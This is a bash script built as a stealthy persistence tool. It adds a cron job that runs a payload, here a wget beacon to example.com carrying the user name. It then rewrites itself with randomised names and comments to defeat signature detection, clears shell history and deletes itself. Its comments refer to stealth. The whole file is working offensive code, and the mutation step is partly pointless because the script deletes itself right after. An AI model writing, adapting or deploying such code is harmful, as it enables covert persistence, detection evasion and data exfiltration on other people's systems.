#!/bin/bash
# --- Configuration --- (MODIFY THESE)

# [[CONFIG_MARKER_START]]
# The command to be scheduled in cron. IMPORTANT: Use absolute paths.
# Example: payload_cmd_4a9b="/usr/bin/touch /tmp/cron_ran_${RANDOM}"
payload_cmd_4a9b="/usr/bin/wget -q -O /dev/null http://example.com/beacon?id=$(whoami)_${RANDOM}"

# The cron schedule. Example: "*/5 * * * *" = every 5 minutes.
cron_schedule_c3d8="0 * * * *" # Example: Every hour at minute 0

# Internal script identifier (used to check if cron job already exists)
script_id_tag_e1f0="POLYCRON_PAYLOAD_ID_$(echo "$payload_cmd_4a9b" | md5sum | cut -d' ' -f1)" # Unique tag
# [[CONFIG_MARKER_END]]


# --- Polymorphism Engine ---

# [[POLY_FUNC_MARKER_START_gen_rand_str_b5a2]]
# Function to generate a random alphanumeric string for renaming
gen_rand_str_b5a2() {
  local len_f6g7=${1:-8}
  head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c ${len_f6g7}
}
# [[POLY_FUNC_MARKER_END_gen_rand_str_b5a2]]

# [[POLY_FUNC_MARKER_START_mutate_self_9h3k]]
# Function to rewrite the script with minor variations
mutate_self_9h3k() {
  local script_path_j2m4="$1"
  local tmp_script_k5n6=$(mktemp)
  
  # 1. Generate new random names for variables and functions (using markers)
  local new_payload_var_l8p0="payload_cmd_$(gen_rand_str_b5a2 4)"
  local new_schedule_var_a1q2="cron_schedule_$(gen_rand_str_b5a2 4)"
  local new_id_tag_var_z5r3="script_id_tag_$(gen_rand_str_b5a2 4)"
  local new_gen_rand_func_w9e8="gen_rand_str_$(gen_rand_str_b5a2 4)"
  local new_mutate_func_c7v6="mutate_self_$(gen_rand_str_b5a2 4)"
  local new_cron_func_x3b5="setup_cron_$(gen_rand_str_b5a2 4)"
  local new_clean_func_y0d9="clean_traces_$(gen_rand_str_b5a2 4)"
  local new_main_func_p4f1="main_logic_$(gen_rand_str_b5a2 4)"
  
  # 2. Read current script and apply changes using sed
  sed \
  -e "s/payload_cmd_4a9b/${new_payload_var_l8p0}/g" \
  -e "s/cron_schedule_c3d8/${new_schedule_var_a1q2}/g" \
  -e "s/script_id_tag_e1f0/${new_id_tag_var_z5r3}/g" \
  -e "s/gen_rand_str_b5a2/${new_gen_rand_func_w9e8}/g" \
  -e "s/mutate_self_9h3k/${new_mutate_func_c7v6}/g" \
  -e "s/setup_cron_a7s1/${new_cron_func_x3b5}/g" \
  -e "s/clean_traces_z2x0/${new_clean_func_y0d9}/g" \
  -e "s/main_logic_k1l9/${new_main_func_p4f1}/g" \
  -e "s/len_f6g7/len_$(gen_rand_str_b5a2 4)/g" \
  -e "s/script_path_j2m4/script_path_$(gen_rand_str_b5a2 4)/g" \
  -e "s/tmp_script_k5n6/tmp_script_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_payload_var_l8p0/new_payload_var_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_schedule_var_a1q2/new_schedule_var_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_id_tag_var_z5r3/new_id_tag_var_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_gen_rand_func_w9e8/new_gen_rand_func_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_mutate_func_c7v6/new_mutate_func_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_cron_func_x3b5/new_cron_func_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_clean_func_y0d9/new_clean_func_$(gen_rand_str_b5a2 4)/g" \
  -e "s/new_main_func_p4f1/new_main_func_$(gen_rand_str_b5a2 4)/g" \
  -e "s/current_cron_m8n3/current_cron_$(gen_rand_str_b5a2 4)/g" \
  -e "s/job_line_b2v7/job_line_$(gen_rand_str_b5a2 4)/g" \
  -e "s/self_path_o9i5/self_path_$(gen_rand_str_b5a2 4)/g" \
  "$script_path_j2m4" > "$tmp_script_k5n6"
  # 3. Add random comments and whitespace (simple example)
  local num_lines=$(wc -l < "$tmp_script_k5n6")
  local insert_line=$(( RANDOM % num_lines + 1 ))
  local random_comment="# $(gen_rand_str_b5a2 15) $(date +%s)"
  sed -i "${insert_line}i\\${random_comment}" "$tmp_script_k5n6"
  insert_line=$(( RANDOM % num_lines + 1 ))
  # Add a blank line
  sed -i "${insert_line}i\\" "$tmp_script_k5n6"
  
  
  # 4. Replace original script file
  # Be careful with permissions and atomicity here. `mv` is generally atomic.
  if [ -s "$tmp_script_k5n6" ]; then # Check if temp file is not empty
    chmod +x "$tmp_script_k5n6" # Ensure executable
    # Overwrite the original script file
    # Note: This might fail if permissions are restrictive or filesystem issues occur.
    if mv "$tmp_script_k5n6" "$script_path_j2m4"; then
      : # Success placeholder
    else
      # echo "Error: Failed to overwrite script file. Cleaning up temp file." >&2
      rm -f "$tmp_script_k5n6" # Clean up temp file on failure
    fi
  else
    # echo "Error: Temporary script file is empty. Mutation failed." >&2
    rm -f "$tmp_script_k5n6" # Clean up empty temp file
  fi
  
  # Ensure temp file is removed if `mv` failed or wasn't attempted
  [ -f "$tmp_script_k5n6" ] && rm -f "$tmp_script_k5n6"
  
}
# [[POLY_FUNC_MARKER_END_mutate_self_9h3k]]


# --- Cron Job Management ---

# [[POLY_FUNC_MARKER_START_setup_cron_a7s1]]
# Function to add the command to crontab if not already present
setup_cron_a7s1() {
  local cron_cmd_c3d8="$1"
  local cron_sched_e1f0="$2"
  local tag_f6g7="$3"
  local job_line_b2v7="${cron_sched_e1f0} ${cron_cmd_c3d8} # ${tag_f6g7}"
  
  # Check if crontab command exists
  if ! command -v crontab &> /dev/null; then
    # echo "Error: 'crontab' command not found. Cannot install cron job." >&2
    return 1
  fi
  
  # Get current crontab, suppress errors if none exists
  local current_cron_m8n3=$(crontab -l 2>/dev/null)
  
  # Check if the job (identified by the tag) already exists
  if echo "$current_cron_m8n3" | grep -Fq -- "$tag_f6g7"; then
    # echo "Cron job already exists."
    : # No action needed
  else
    # echo "Adding cron job..."
    # Add the new job to the existing crontab (or create a new one)
    (echo "$current_cron_m8n3"; echo "$job_line_b2v7") | crontab -
    # Check exit status? Maybe not for stealth.
  fi
}
# [[POLY_FUNC_MARKER_END_setup_cron_a7s1]]


# --- Self-Cleaning ---

# [[POLY_FUNC_MARKER_START_clean_traces_z2x0]]
# Function to attempt trace removal
clean_traces_z2x0() {
  local self_path_o9i5="$1"
  
  # 1. Attempt to clear current shell history buffer (unreliable)
  # This may or may not prevent the command invoking this script from being saved,
  # depending on shell settings (e.g., HISTCONTROL=ignorespace, PROMPT_COMMAND).
  # It won't clear history already written to disk by other sessions.
  ( (history -c 2>/dev/null || :) && (history -w 2>/dev/null || :) ) & # Run in subshell, detach
  
  # 2. Schedule self-deletion
  # Run 'rm' in the background, detached from the current shell, after a short delay.
  # This allows the main script to exit cleanly before 'rm' executes.
  # Using 'nohup' and 'disown' helps it survive the parent shell exiting.
  # Redirect output to /dev/null to avoid messages.
  # Use the absolute path to be safe.
  if [ -n "$self_path_o9i5" ] && [ -f "$self_path_o9i5" ]; then
    ( sleep 1 && rm -- "$self_path_o9i5" ) > /dev/null 2>&1 &
    disown -h %1 2>/dev/null || disown %1 2>/dev/null || : # Try to disown the background job
  fi
}
# [[POLY_FUNC_MARKER_END_clean_traces_z2x0]]


# --- Main Execution ---

# [[POLY_FUNC_MARKER_START_main_logic_k1l9]]
main_logic_k1l9() {
  # Get the absolute path to the script itself
  # Using readlink -f is generally reliable for finding the canonical path.
  local script_abs_path
  script_abs_path=$(readlink -f "$0")
  # Fallback if readlink fails (e.g., non-GNU systems or weird paths)
  if [ -z "$script_abs_path" ]; then
    script_abs_path="$0" # Use original path as fallback, might be relative
  fi
  
  # 1. Install/Verify the Cron Job
  setup_cron_a7s1 "$payload_cmd_4a9b" "$cron_schedule_c3d8" "$script_id_tag_e1f0"
  
  # 2. Mutate the script file for the next potential run
  # Pass the absolute path to the mutation function
  mutate_self_9h3k "$script_abs_path"
  
  # 3. Clean up traces (including scheduling self-deletion)
  # Pass the absolute path for reliable deletion
  clean_traces_z2x0 "$script_abs_path"
  
  # Exit cleanly
  exit 0
}
# [[POLY_FUNC_MARKER_END_main_logic_k1l9]]

# --- Script Entry Point ---
# Call the main logic function using its current polymorphic name
main_logic_k1l9

# Final fallback exit (shouldn't be reached if main_logic exits)
exit 1
